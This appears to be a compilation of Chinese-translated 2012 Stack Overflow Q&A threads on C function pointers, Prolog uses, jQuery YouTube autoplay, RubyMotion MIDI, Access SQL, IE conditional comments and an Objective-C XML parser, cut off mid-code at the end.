> ID：10772529
> 
> 赞同：1
> 
> 时间：2012-05-27T08:02:47.353
> 
> 标签：c

我在下面列出了一些示例代码，问题是 function_name 是否有办法从 struct_name 访问 number 的值？

```
typedef struct struct_name {  
int number  
void (*func)();  
} * struct_name_ptr;  

void function_name() {  
//access number from struct  
}

main() {  
  struct_name_ptr newobject;  
  newobject->func=&function_name;  
  newobject->func(); //can it print the value of the number in the structure above?  
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T08:06:16.790

呃 - 不。

一个结构当然可以*包含*一个函数指针。但是您调用的函数对结构一无所知。除非您将指针作为函数参数传递，或者将结构设为全局。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T11:51:00.457

您可以在纯 C 中“模拟”一个简单的 OOP，例如：

```
typedef struct {
int number;
void (*func)();
} class;

void function_name(class *this) {
  printf("%d",this->number);
}

#define CALL(c,f) c.f(&c)

int main() {
  class object={12345,function_name};

  CALL(object,func); // voilá
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T08:25:28.017

好吧，有两件事， struct_name->number 应该有一个值，它要么需要与 &function_name 在同一范围内，要么需要显式传递。有两种方法：

/* 这里是一个全局调用结构 */

```
#include<stdio.h>

typedef struct struct_name {
    int number;
    void (*func)();
    } * struct_name_ptr;

struct struct_name newobject = { 0 }; 

void function_name() {
    printf("%d",struct_name);
}

void main() {

    struct struct_name_ptr newobject;

    newobject->func=&function_name;
    newobject->func();
} 
```

/* 一个修改了 function_name */

```
#include<stdio.h>

typedef struct struct_name {
    int number;
    void (*func)();
    } * struct_name_ptr;

void function_name(struct_name) {
    printf("%d",struct_name);
}

void main() {

    struct struct_name_ptr newobject;
    newobject.number = 0;

    newobject->func=&function_name;
    newobject->func(newobject);
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-27T09:00:24.740

不，披萨永远不会知道送披萨的披萨送货员长什么样。

常规函数只是内存中的一个地址。在这种情况下，可以使用函数指针调用它。无论如何：**该函数不知道它是如何被调用的。特别是它不会知道它是使用函数指针调用的，该函数指针是某个结构（对应的一块内存）的一部分。**

当使用像 C++ 这样的类语言时，成员函数将有一个隐藏参数，它是指向类实例的指针。这就是成员函数了解其数据的方式。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-27T08:08:32.333

以我有限的编程知识，我认为这是不可能的。尽管该结构包含一个函数指针，但分配给它的函数的地址是不同的，我认为除非您将它作为参数传递，否则它无论如何都不会访问它。

# prolog - Prolog 如何使用和实现现实世界的应用程序

> ID：10772530
> 
> 赞同：7
> 
> 时间：2012-05-27T08:02:49.030
> 
> 标签：prolog

我对此很好奇。我必须为我的课程学习 Prolog，但我看到的大多数应用程序都是使用 C++、C# 或 Java 编写的。Prolog 编写的应用程序，对我来说是非常非常难得的应用程序。

所以，我想知道 Prolog 是如何使用和实现现实世界的应用程序的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-28T13:41:13.947

SWI-Prolog 网站由... SWI-prolog 提供，仅使用可用库的一小部分。

好吧，它不是商业应用程序，而是相当[真实的世界](http://www.swi-prolog.org/)。

需要付出很多努力才能使运行时能够执行 24x7 服务（主要是垃圾收集）和所需的性能可伸缩性（以及其他多线程）。

几个库是由现实世界的应用程序需求驱动的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T10:01:30.427

我曾经问过我的主管一个类似的问题，当时他正在给我们做 Prological 讲座。

他告诉我，人们并没有真正使用 prolog 来实现整个庞大的系统。相反，人们用其他语言（更理智和琐碎）编写主要部分，并将其链接到“决策程序”或用 Prolog 编写的东西。

不确定其他 Prolog 实现，我们使用的是 BProlog，它提供 C/Java 接口。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T16:55:21.647

*   **Microsoft Windows NT 网络安装和配置小程序**

其中一个臭名昭著的例子是 Microsoft Windows NT OS 网络接口配置代码，它涉及内置的 Small Prolog 解释器。这是David Hovel 为 Dobbs 博士撰写的故事的[链接。](http://www.drdobbs.com/cpp/184409294)（*经常被引用的微软研究院链接好像不见了。*）

*   **专家系统**

曾经，Prolog 被认为是一类称为*专家系统*的软件系统的语言。这些是交互式知识管理系统，通常带有关系数据库后端。

*   **超越序言**

一般来说，基于规则的编程、解析和不同的自动推理系统在 Prolog 之外被广泛使用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-27T08:17:33.510

根据 Tiobe Software Index，Prolog 目前排名第 36：在 Haskell 和 FoxPro 之间：

[http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html](http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html)

它是干什么用的？

我第一次听说日本（现已不复存在）的“第五代”项目：

[http://en.wikipedia.org/wiki/Fifth_generation_computer](http://en.wikipedia.org/wiki/Fifth_generation_computer)

坦率地说，我真的不知道有人使用 Prolog 进行任何严肃的商业开发。

# jquery - 通过 jQuery 在 youtube 嵌入电影中启用自动播放

> ID：10772538
> 
> 赞同：4
> 
> 时间：2012-05-27T08:04:22.567
> 
> 标签：jquery, youtube, autoplay

我使用以下代码嵌入了 youtube 电影：

```
<iframe id="ytplayer" type="text/html" width="840" height="470" src="http://www.youtube.com/embed/Bag1gUxuU0g?wmode=transparent&amp;autoplay=0&amp;autohide=1" frameborder="0"></iframe> 
```

正如您在 src 属性中看到的，有一个变量 autoplay=0。我在 jQuery 中编写了两行脚本，应该将自动播放变量设置为 1。

```
var title = $("iframe#ytplayer").attr("src");
title.replace("autoplay=0", "autoplay=1"); 
```

但它不起作用。如何正确地做到这一点？

问候，大卫

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-27T08:10:21.957

您没有修改 src 属性。

```
$("iframe#ytplayer").attr("src", $("iframe#ytplayer").attr("src").replace("autoplay=0", "autoplay=1")); 
```

# objective-c - 如何使用 RubyMotion 遍历 MIDIPacketList？

> ID：10772539
> 
> 赞同：1
> 
> 时间：2012-05-27T08:04:24.703
> 
> 标签：objective-c, coremidi, rubymotion

我如何将[这个 PGMidi 示例代码](https://github.com/petegoodliffe/PGMidi/blob/master/Sources/UI/MidiMonitorViewController.mm#L158-172)翻译成 RubyMotion？[MIDIPacketList 的文档](https://developer.apple.com/library/mac/#documentation/MusicAudio/Reference/CACoreMIDIRef/MIDIServices/CompositePage.html#//apple_ref/c/tag/MIDIPacketList)提到了特殊的警告，我不确定如何在 RubyMotion 中解释它们。例子：

> 请注意，列表中的数据包虽然定义为数组，但可能无法作为数组访问，因为它们是可变长度的。

就我在翻译中得到的而言，这是示例，并且更进一步：

```
- (void) midiSource:(PGMidiSource*)midi midiReceived:(const MIDIPacketList *)packetList
{
    [self performSelectorOnMainThread:@selector(addString:)
                           withObject:@"MIDI received:"
                        waitUntilDone:NO];

    const MIDIPacket *packet = &packetList->packet[0];
    for (int i = 0; i < packetList->numPackets; ++i)
    {
        [self performSelectorOnMainThread:@selector(addString:)
                               withObject:StringFromPacket(packet)
                            waitUntilDone:NO];
        packet = MIDIPacketNext(packet);
    }
} 
```

我知道我正在丢失使用“packet”本地变量和“packetList”引用/取消引用的指针，但我很难弄清楚如何纠正它：

```
def midiSource(midi, midiReceived:packetList)
  self.performSelectorOnMainThread('addString',
                   withObject:'MIDI received:',
                   waitUntilDone:false)

  packet = packetList.packet[0]
  i = 0
  while i < packetList.numPackets
    i += 1

    self.performSelectorOnMainThread('addString',
                                     withObject:stringFromPacket(packet),
                                     waitUntilDone:false)
    packet = MIDIPacketNext(packet)
  end
end 
```

感谢您的任何指导！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-11T01:34:20.237

如果它正在处理您正在寻找的指针，RubyMotion 会提供`Pointer`该类。[http://www.rubymotion.com/developer-center/guides/runtime/#_pointers](http://www.rubymotion.com/developer-center/guides/runtime/#_pointers)

# sql - 访问查询以显示未受邀参加活动的客人

> ID：10772540
> 
> 赞同：1
> 
> 时间：2012-05-27T08:04:33.117
> 
> 标签：sql, events, contacts

我正在编写一个联系人和事件数据库，并希望查看那些未受邀参加特定事件的联系人。我有以下表格和查询：

联系人 - 表
事件 - 表
ContactInvitation - 表（创建 EventID 和 ContactID 的 PK 以显示谁被邀请参加哪个事件）

客人和活动 - 查询（显示联系人的所有实例以及他们被邀请的活动）

在来宾和活动中，如果未邀请联系人参加活动，则活动字段为空白。如果他们被邀请参加多个活动，则会有重复的联系人姓名显示他们被邀请参加的活动。例如

Mark - Null
Sean - Null
Steven - 事件 1
Steven - 事件 2
Mike - 事件 1
Jill - 事件 1
Rob - 事件 2

我现在想过滤这些联系人以仅显示（每个联系人的 1 个实例）未受邀参加特定活动的人。例如，显示所有未受邀参加事件 1 的联系人。

NotInvited to event 1 的查询应该显示 Mark, Sean & Rob。

但是，我很难接受 Steven 被邀请参加活动 1 和 2 的事实，所以如果我过滤“Event<>1 OR Event=Null”，即使他已被邀请参加活动 1，Steven 仍然会出现在列表中。

请帮忙！这一直让我发疯。最近几天我一直在谷歌上搜索，虽然我现在已经了解了 GROUPBY 和子查询，但我似乎无法找到解决方案。

非常感谢您抽出宝贵时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:30:58.987

`ContactInvitation`我将首先从具有 NULL的行中删除所有行。它们没用，可能会造成麻烦。如果一个人没有被邀请参加某个活动，那么您在表中就没有该（邀请）的行。无需使用 Null 放置行。

```
DELETE FROM ContactInvitation 
WHERE EventID IS NULL ; 
```

然后你可以使用这个查询：

```
SELECT c.*
FROM Contacts AS c
WHERE NOT EXISTS
      ( SELECT * 
        FROM ContactInvitation AS i
        WHERE i.ContactID = c.ContactID
          AND i.EventID = 'Event 1' 
      ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T08:11:38.900

我不熟悉访问，但一般来说，最简单的方法是：

```
SELECT * FROM ContactInvitation WHERE EventID NOT IN ('Event 1') GROUP BY ContactID 
```

# html - 关于 HTML 条件注释

> ID：10772543
> 
> 赞同：2
> 
> 时间：2012-05-27T08:05:10.757
> 
> 标签：html, internet-explorer, browser, internet-explorer-6, conditional-comments

`A`如果浏览器是 IE 6 或更低版本，我试图显示一个跨度，或者`B`如果浏览器大于 IE 6 或不是 IE，我试图显示一个跨度。

```
<!--[if lte IE 6]><!--><span>You're using IE 6 or lower.</span><!--<![endif]-->
<!--[if (!IE)|(gt IE 6)]><!--><span>You're using IE 7 or greater or another browser.</span><!--<![endif]-->​ 
```

这在我拥有的每个 Internet Explorer 版本中都能完美运行，但在 Chrome 和 Firefox中，*两个*跨度都会显示。我猜他们不承认这个条件，因为它们是微软特有的。

有没有办法在不重复使用 JavaScript 的情况下做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-27T08:14:16.023

您的第一个条件评论应该是：

```
<!--[if lte IE 6]><span>You're using IE 6 or lower.</span><![endif]--> 
```

这是一个单独的注释 ( `<!-- … -->`)，大多数浏览器都会这样处理。只有 IE 会将其视为评论以外的任何内容，并且只有 IE <= 6 会显示`span`.

将其与您现在拥有的进行比较：

```
<!--[if lte IE 6]><!--><span>You're using IE 6 or lower.</span><!--<![endif]--> 
```

这是*两个*注释 (`<!--[if lte IE 6]><!-->`和`<!--<![endif]-->`)，它们之间有一些标记。由于只有 IE 知道评论有任何特殊性，其他浏览器会显示内容，但不会显示两条评论。

您可以在 Quirksmode 上找到关于条件注释的非常详尽的[指南](http://www.quirksmode.org/css/condcom.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T08:07:29.590

> 这在我拥有的每个 Internet Explorer 版本中都能完美运行，但在 Chrome 和 Firefox 中，两个跨度都会显示。

好吧，他们会的。

条件注释是 IE 的一项功能。仅有的。其他浏览器将它们视为普通注释。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T08:23:15.817

这是一个[测试用例](http://jsfiddle.net/yhMTT/3/)。

如您所见，我使用了两种类型的评论。下层显示和下层隐藏，以支持非 IE 浏览器。有关此主题的更多信息，请阅读[Microsoft](http://msdn.microsoft.com/en-us/library/ms537512%28v=vs.85%29.aspx#dlrevealed)关于此的帖子。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-27T08:35:19.790

摆脱第二条评论和

只保留：

```
<!--[if lte IE 6]> code <![endif]--> 
```

您正在评论代码本身，但它没有显示出来。

# xml - 可变数组的问题

> ID：10772545
> 
> 赞同：0
> 
> 时间：2012-05-27T08:05:29.973
> 
> 标签：xml, nsmutablearray

我有这个代码

```
- (void)parser:(NSXMLParser *)parser didEndElement:(NSString *)elementName 
  namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName {

    if([elementName isEqualToString:@"xml"])
        return;

    //There is nothing to do if we encounter the Books element here.
    //If we encounter the Book element howevere, we want to add the book object to the array
    // and release the object.
    if([elementName isEqualToString:@"bewerb"]) {
        [xmlmasterviewcontroller.books addObject:aBook];

        NSLog(@"Test ::::: %@",[xmlmasterviewcontroller.books objectAtIndex:1]);

    //  [aBook release];
        aBook = nil;
    }
    else 
        [aBook setValue:currentElementValue forKey:elementName];

//  [currentElementValue release];
    currentElementValue = nil;
} 
```

所以 books 是 XMLMasterViewController 中的一个 Mutablearray！它编译没有错误，但在 XMLMasterViewController 中声明的 Mutablearray“书”总是空的！

我怎么了？？？？

需要帮忙！

代码 XMLAppDelegate.h

```
#import <UIKit/UIKit.h>

@interface XMLAppDelegate : UIResponder <UIApplicationDelegate>

@property (strong, nonatomic) UIWindow *window;

@property (readonly, strong, nonatomic) NSManagedObjectContext *managedObjectContext;
@property (readonly, strong, nonatomic) NSManagedObjectModel *managedObjectModel;
@property (readonly, strong, nonatomic) NSPersistentStoreCoordinator *persistentStoreCoordinator;

- (void)saveContext;
- (NSURL *)applicationDocumentsDirectory;

@end 
```

XMLAppDelegate.m

```
#import "XMLAppDelegate.h"
#import "XMLParser.h"

#import "XMLMasterViewController.h"

@implementation XMLAppDelegate

@synthesize window = _window;
@synthesize managedObjectContext = __managedObjectContext;
@synthesize managedObjectModel = __managedObjectModel;
@synthesize persistentStoreCoordinator = __persistentStoreCoordinator;

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    // Override point for customization after application launch.

    XMLParser *parser = [[XMLParser alloc] initXMLParser];

    UINavigationController *navigationController = (UINavigationController *)self.window.rootViewController;
    XMLMasterViewController *controller = (XMLMasterViewController *)navigationController.topViewController;
    controller.managedObjectContext = self.managedObjectContext;
    return YES;
}

- (void)applicationWillResignActive:(UIApplication *)application
{
    /*
     Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
     Use this method to pause ongoing tasks, disable timers, and throttle down OpenGL ES frame rates. Games should use this method to pause the game.
     */
}

- (void)applicationDidEnterBackground:(UIApplication *)application
{
    /*
     Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later. 
     If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
     */
}

- (void)applicationWillEnterForeground:(UIApplication *)application
{
    /*
     Called as part of the transition from the background to the inactive state; here you can undo many of the changes made on entering the background.
     */
}

- (void)applicationDidBecomeActive:(UIApplication *)application
{
    /*
     Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
     */
}

- (void)applicationWillTerminate:(UIApplication *)application
{
    // Saves changes in the application's managed object context before the application terminates.
    [self saveContext];
}

- (void)saveContext
{
    NSError *error = nil;
    NSManagedObjectContext *managedObjectContext = self.managedObjectContext;
    if (managedObjectContext != nil)
    {
        if ([managedObjectContext hasChanges] && ![managedObjectContext save:&error])
        {
            /*
             Replace this implementation with code to handle the error appropriately.

             abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. 
             */
            NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
            abort();
        } 
    }
}

#pragma mark - Core Data stack

/**
 Returns the managed object context for the application.
 If the context doesn't already exist, it is created and bound to the persistent store coordinator for the application.
 */
- (NSManagedObjectContext *)managedObjectContext
{
    if (__managedObjectContext != nil)
    {
        return __managedObjectContext;
    }

    NSPersistentStoreCoordinator *coordinator = [self persistentStoreCoordinator];
    if (coordinator != nil)
    {
        __managedObjectContext = [[NSManagedObjectContext alloc] init];
        [__managedObjectContext setPersistentStoreCoordinator:coordinator];
    }
    return __managedObjectContext;
}

/**
 Returns the managed object model for the application.
 If the model doesn't already exist, it is created from the application's model.
 */
- (NSManagedObjectModel *)managedObjectModel
{
    if (__managedObjectModel != nil)
    {
        return __managedObjectModel;
    }
    NSURL *modelURL = [[NSBundle mainBundle] URLForResource:@"XML212" withExtension:@"momd"];
    __managedObjectModel = [[NSManagedObjectModel alloc] initWithContentsOfURL:modelURL];
    return __managedObjectModel;
}

/**
 Returns the persistent store coordinator for the application.
 If the coordinator doesn't already exist, it is created and the application's store added to it.
 */
- (NSPersistentStoreCoordinator *)persistentStoreCoordinator
{
    if (__persistentStoreCoordinator != nil)
    {
        return __persistentStoreCoordinator;
    }

    NSURL *storeURL = [[self applicationDocumentsDirectory] URLByAppendingPathComponent:@"XML212.sqlite"];

    NSError *error = nil;
    __persistentStoreCoordinator = [[NSPersistentStoreCoordinator alloc] initWithManagedObjectModel:[self managedObjectModel]];
    if (![__persistentStoreCoordinator addPersistentStoreWithType:NSSQLiteStoreType configuration:nil URL:storeURL options:nil error:&error])
    {
        /*
         Replace this implementation with code to handle the error appropriately.

         abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. 

         Typical reasons for an error here include:
         * The persistent store is not accessible;
         * The schema for the persistent store is incompatible with current managed object model.
         Check the error message to determine what the actual problem was.

         If the persistent store is not accessible, there is typically something wrong with the file path. Often, a file URL is pointing into the application's resources directory instead of a writeable directory.

         If you encounter schema incompatibility errors during development, you can reduce their frequency by:
         * Simply deleting the existing store:
         [[NSFileManager defaultManager] removeItemAtURL:storeURL error:nil]

         * Performing automatic lightweight migration by passing the following dictionary as the options parameter: 
         [NSDictionary dictionaryWithObjectsAndKeys:[NSNumber numberWithBool:YES], NSMigratePersistentStoresAutomaticallyOption, [NSNumber numberWithBool:YES], NSInferMappingModelAutomaticallyOption, nil];

         Lightweight migration will only work for a limited set of schema changes; consult "Core Data Model Versioning and Data Migration Programming Guide" for details.

         */
        NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
        abort();
    }    

    return __persistentStoreCoordinator;
}

#pragma mark - Application's Documents directory

/**
 Returns the URL to the application's Documents directory.
 */
- (NSURL *)applicationDocumentsDirectory
{
    return [[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject];
}

@end 
```

XMLParser.h

```
#import <UIKit/UIKit.h>

@class XMLAppDelegate, Book,XMLMasterViewController;

@interface XMLParser : NSObject {

    NSMutableString *currentElementValue;

    XMLAppDelegate *appDelegate;
    XMLMasterViewController *xmlmasterviewcontroller;
    Book *aBook;

}

- (XMLParser *) initXMLParser;

@end 
```

XMLParser.m

```
#import "XMLParser.h"
#import "XMLAppDelegate.h"
#import "Book1.h"
#import "XMLMasterViewController.h"

@implementation XMLParser

- (XMLParser *) initXMLParser {

    appDelegate = (XMLAppDelegate *)[[UIApplication sharedApplication] delegate];

    return self;
}

- (void)parser:(NSXMLParser *)parser didStartElement:(NSString *)elementName 
   namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qualifiedName 
     attributes:(NSDictionary *)attributeDict {

//    if(parser == tabellenviewcontroller.parser2){}

    if([elementName isEqualToString:@"Books"]) {
        //Initialize the array.

        xmlmasterviewcontroller.books = [[NSMutableArray alloc] init];

    }
    else if([elementName isEqualToString:@"Book"]) {

        //Initialize the book.
        aBook = [[Book alloc] init];

        //Extract the attribute here.
        //Extract the attribute here.
        aBook.bookID = [[attributeDict objectForKey:@"id"] integerValue];

        NSLog(@"Reading id value :%i", aBook.bookID);
    }

    NSLog(@"Processing Element: %@", elementName);    
}

- (void)parser:(NSXMLParser *)parser foundCharacters:(NSString *)string { 

    if(!currentElementValue) 
        currentElementValue = [[NSMutableString alloc] initWithString:string];
    else
        [currentElementValue appendString:string];

    NSLog(@"Processing Value: %@", currentElementValue);

}

- (void)parser:(NSXMLParser *)parser didEndElement:(NSString *)elementName 
  namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName {

    if([elementName isEqualToString:@"Books"])
        return;

    //There is nothing to do if we encounter the Books element here.
    //If we encounter the Book element howevere, we want to add the book object to the array
    // and release the object.
    if([elementName isEqualToString:@"Book"]) {
        [xmlmasterviewcontroller.books addObject:aBook];

    //  [aBook release];
//      aBook = nil;
    }
    else 
        [aBook setValue:currentElementValue forKey:elementName];

//  [currentElementValue release];
    Book *abook3 =[xmlmasterviewcontroller.books objectAtIndex:1];

    NSLog(@"Test ::::: %@",abook3.title);
    currentElementValue = nil;
}
/*
- (void) dealloc {

    [aBook release];
    [currentElementValue release];
    [super dealloc];
}*/

@end 
```

书.h

```
 #import <UIKit/UIKit.h>

    @interface Book : NSObject {

        NSInteger bookID;
        NSString *title; //Same name as the Entity Name.
        NSString *author; //Same name as the Entity Name.
        NSString *summary; //Same name as the Entity Name.

    }

    @property (nonatomic, readwrite) NSInteger bookID;
    @property (nonatomic, retain) NSString *title;
    @property (nonatomic, retain) NSString *author;
    @property (nonatomic, retain) NSString *summary;

@end 
```

书.m

```
#import "Book.h"

@implementation Book

@synthesize title, author, summary, bookID;

@end 
```

XMLMasterViewController.h

```
#import <UIKit/UIKit.h>

#import <CoreData/CoreData.h>

@class Book, XMLAppDelegate;
@interface XMLMasterViewController : UITableViewController <NSFetchedResultsControllerDelegate> {

    XMLAppDelegate *appDelegate;

}

@property (strong, nonatomic) NSFetchedResultsController *fetchedResultsController;
@property (strong, nonatomic) NSManagedObjectContext *managedObjectContext;
@property (nonatomic, retain) NSMutableArray *books;

@end 
```

XMLMasterViewController.m

```
#import "XMLMasterViewController.h"
#import "XMLParser.h"
#import "XMLDetailViewController.h"
#import "Book1.h"

@interface XMLMasterViewController ()
- (void)configureCell:(UITableViewCell *)cell atIndexPath:(NSIndexPath *)indexPath;
@end

@implementation XMLMasterViewController

@synthesize fetchedResultsController = __fetchedResultsController;
@synthesize managedObjectContext = __managedObjectContext;
@synthesize books;

- (void)awakeFromNib
{
    [super awakeFromNib];
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Release any cached data, images, etc that aren't in use.
}

#pragma mark - View lifecycle

- (void)viewDidLoad
{
   // appDelegate = (XMLAppDelegate *)[[UIApplication sharedApplication] delegate];

    NSURL *url = [[NSURL alloc] initWithString:@"http://sites.google.com/site/iphonesdktutorials/xml/Books.xml"];
    NSXMLParser *xmlParser = [[NSXMLParser alloc] initWithContentsOfURL:url];

    //Initialize the delegate.
    XMLParser *parser = [[XMLParser alloc] initXMLParser];

    //Set delegate
    [xmlParser setDelegate:parser];

    //Start parsing the XML file.
    BOOL success = [xmlParser parse];

    if(success){
        NSLog(@"No Errors");

      // Book *aBook = [self.books objectAtIndex:1];

    }
    else
        NSLog(@"Error Error Error!!!");

    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    // Set up the edit and add buttons.
    self.navigationItem.leftBarButtonItem = self.editButtonItem;

    UIBarButtonItem *addButton = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemAdd target:self action:@selector(insertNewObject)];
    self.navigationItem.rightBarButtonItem = addButton;
}

- (void)viewDidUnload
{
    [super viewDidUnload];
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
}

- (void)viewDidAppear:(BOOL)animated
{
    [super viewDidAppear:animated];
}

- (void)viewWillDisappear:(BOOL)animated
{
    [super viewWillDisappear:animated];
}

- (void)viewDidDisappear:(BOOL)animated
{
    [super viewDidDisappear:animated];
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    // Return YES for supported orientations
    return (interfaceOrientation != UIInterfaceOrientationPortraitUpsideDown);
}

// Customize the number of sections in the table view.
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
   // return [[self.fetchedResultsController sections] count];
     return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
   // id <NSFetchedResultsSectionInfo> sectionInfo = [[self.fetchedResultsController sections] objectAtIndex:section];
    // return [sectionInfo numberOfObjects];

    return 1;
}

// Customize the appearance of table view cells.
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    [self configureCell:cell atIndexPath:indexPath];

    Book *aBook = [books objectAtIndex:indexPath.row];
    cell.textLabel.font = [UIFont fontWithName:@"helvetica" size:14];
    cell.textLabel.text = aBook.title;
    cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
    return cell;
}

/*
// Override to support conditional editing of the table view.
- (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath
{
    // Return NO if you do not want the specified item to be editable.
    return YES;
}
*/

- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (editingStyle == UITableViewCellEditingStyleDelete) {
        // Delete the managed object for the given index path
        NSManagedObjectContext *context = [self.fetchedResultsController managedObjectContext];
        [context deleteObject:[self.fetchedResultsController objectAtIndexPath:indexPath]];

        // Save the context.
        NSError *error = nil;
        if (![context save:&error]) {
            /*
             Replace this implementation with code to handle the error appropriately.

             abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. 
             */
            NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
            abort();
        }
    }   
}

- (BOOL)tableView:(UITableView *)tableView canMoveRowAtIndexPath:(NSIndexPath *)indexPath
{
    // The table view should not be re-orderable.
    return NO;
}

- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    if ([[segue identifier] isEqualToString:@"showDetail"]) {
        NSIndexPath *indexPath = [self.tableView indexPathForSelectedRow];
        NSManagedObject *selectedObject = [[self fetchedResultsController] objectAtIndexPath:indexPath];
        [[segue destinationViewController] setDetailItem:selectedObject];
    }
}

#pragma mark - Fetched results controller

- (NSFetchedResultsController *)fetchedResultsController
{
    if (__fetchedResultsController != nil) {
        return __fetchedResultsController;
    }

    // Set up the fetched results controller.
    // Create the fetch request for the entity.
    NSFetchRequest *fetchRequest = [[NSFetchRequest alloc] init];
    // Edit the entity name as appropriate.
    NSEntityDescription *entity = [NSEntityDescription entityForName:@"Event" inManagedObjectContext:self.managedObjectContext];
    [fetchRequest setEntity:entity];

    // Set the batch size to a suitable number.
    [fetchRequest setFetchBatchSize:20];

    // Edit the sort key as appropriate.
    NSSortDescriptor *sortDescriptor = [[NSSortDescriptor alloc] initWithKey:@"timeStamp" ascending:NO];
    NSArray *sortDescriptors = [NSArray arrayWithObjects:sortDescriptor, nil];

    [fetchRequest setSortDescriptors:sortDescriptors];

    // Edit the section name key path and cache name if appropriate.
    // nil for section name key path means "no sections".
    NSFetchedResultsController *aFetchedResultsController = [[NSFetchedResultsController alloc] initWithFetchRequest:fetchRequest managedObjectContext:self.managedObjectContext sectionNameKeyPath:nil cacheName:@"Master"];
    aFetchedResultsController.delegate = self;
    self.fetchedResultsController = aFetchedResultsController;

    NSError *error = nil;
    if (![self.fetchedResultsController performFetch:&error]) {
        /*
         Replace this implementation with code to handle the error appropriately.

         abort() causes the application to generate a crash log and terminate. You should not use this function in a shipping application, although it may be useful during development. 
         */
        NSLog(@"Unresolved error %@, %@", error, [error userInfo]);
        abort();
    }

    return __fetchedResultsController;
}    

- (void)controllerWillChangeContent:(NSFetchedResultsController *)controller
{
    [self.tableView beginUpdates];
}

- (void)controller:(NSFetchedResultsController *)controller didChangeSection:(id <NSFetchedResultsSectionInfo>)sectionInfo
           atIndex:(NSUInteger)sectionIndex forChangeType:(NSFetchedResultsChangeType)type
{
    switch(type) {
        case NSFetchedResultsChangeInsert:
            [self.tableView insertSections:[NSIndexSet indexSetWithIndex:sectionIndex] withRowAnimation:UITableViewRowAnimationFade];
            break;

        case NSFetchedResultsChangeDelete:
            [self.tableView deleteSections:[NSIndexSet indexSetWithIndex:sectionIndex] withRowAnimation:UITableViewRowAnimationFade];
            break;
    }
}

- (void)controller:(NSFetchedResultsController *)controller didChangeObject:(id)anObject
       atIndexPath:(NSIndexPath *)indexPath forChangeType:(NSFetchedResultsChangeType)type
      newIndexPath:(NSIndexPath *)newIndexPath
{
    UITableView *tableView = self.tableView;

    switch(type) {
        case NSFetchedResultsChangeInsert:
            [tableView insertRowsAtIndexPaths:[NSArray arrayWithObject:newIndexPath] withRowAnimation:UITableViewRowAnimationFade];
            break;

        case NSFetchedResultsChangeDelete:
            [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
            break;

        case NSFetchedResultsChangeUpdate:
            [self configureCell:[tableView cellForRowAtIndexPath:indexPath] atIndexPath:indexPath];
            break;

        case NSFetchedResultsChangeMove:
            [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
            [tableView insertRowsAtIndexPaths:[NSArray arrayWithObject:newIndexPath]withRowAnimation:UITableViewRowAnimationFade];
            break;
    }
}

- (void)controllerDidChangeContent:(NSFetchedResultsController *)controller
{
    [self.tableView endUpdates];
}

/*
